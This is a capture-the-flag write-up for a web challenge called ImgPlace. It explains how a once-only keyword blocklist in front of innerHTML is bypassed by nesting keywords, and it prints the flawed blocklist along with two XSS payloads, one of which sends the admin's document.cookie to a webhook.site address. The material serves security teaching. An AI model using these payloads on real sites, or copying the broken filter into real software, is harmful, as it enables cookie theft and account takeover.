# ImgPlace

**Author**: Daniele [dadadani.xyz](https://dadadani.xyz) <br>
**Category**: Web <br>
**Solve**: 13 <br> 

## Description

Are you a photographer but have no reputation? Join ImgPlace! Share your photos... and become popular!

## How to run the server
To run the server you need [`docker`](https://docs.docker.com/get-started/get-docker/) installed. <br>
Then you can navigate to the `src` folder and run the command `docker compose up --build -d`. <br>
Now you can connect to the server by opening [`http://localhost:3000/`](http://localhost:3000/) in your browser. <br>
To shut down the server run the command `docker compose down`.

## Solution

This website allows users to uploads "photos". Each post may also containg a description.

By looking at the source code of the post page, we can see that a file called `pic.js` is loaded:

```javascript

...

        // We need to block dangerous things!
        const blocklist = [
            "<comment",
            "<embed",
            "<link",
            "<listing",
            "<meta",
            "<noscript",
            "<object",
            "<plaintext",
            "<script",
            "<xmp",
            "<style",
            "<applet",
            "<iframe",
            "<img",
            "onload",
            "onblur",
            "onclick",
            "onerror",
            "href",
            "javascript",
            "window",
            "src",
        ];
        let description = String(data.description);
        blocklist.forEach((word) => {
            description = description.replace(word, "");
        });

        picDesc.innerHTML = description;
    } else {

... 


```

The description is set by using `innerHTML`, which is inherently unsafe.

To prevent attackers from using tags like `<script>`, a blocklist is introduced. Unfortunately, it can be easily bypassed due to the `replace` function only looking one time for words to replace. This allows us to do something like:

```html
<if<iframerame srsrcc="https://example.com" onlonloadoad="alert(1)"></iframe>
```

Additionally, the admin stores the flag inside cookies. We can use a website like [webhook.site](https://webhook.site) to redirect the admin and log the request that has been done.

```html
<if<iframerame srsrcc="https://example.com" onlonloadoad="winwindowdow.location.hrhrefef='https://webhook.site/.../'+document.cookie"></iframe>
```
